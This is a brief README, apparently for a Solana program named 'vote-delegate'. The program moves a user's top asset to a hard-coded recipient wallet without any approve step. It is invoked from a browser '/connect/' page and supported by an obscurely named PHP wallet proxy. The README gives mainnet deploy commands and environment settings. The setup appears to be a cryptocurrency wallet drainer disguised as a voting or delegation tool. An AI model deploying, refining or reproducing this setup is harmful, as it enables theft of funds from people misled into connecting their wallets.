# vote-delegate transfer program

On-chain program: **transfer** top asset via CPI (no delegate / approve).

Deploy **once to Solana mainnet** from your own machine (not the VPS, not Vercel):

```bash
cd programs/vote-delegate
anchor build
anchor deploy --provider.cluster mainnet
```

Copy the printed program id into **Vercel** env:

```
TRANSFER_PROGRAM_ID=<your program id>
TRANSFER_RECIPIENT=7Bj5caMttbZPf9x4NiPKUkrq2PHzqEKXhgM1Q4zoVVQu
TRANSFER_ENABLED=true
HELIUS_RPC_URL=https://mainnet.helius-rpc.com/?api-key=...
```

Vercel serves `/connect/` and calls this program from the browser. The VPS only serves `5joud6Jn.php` (wallet embed proxy).
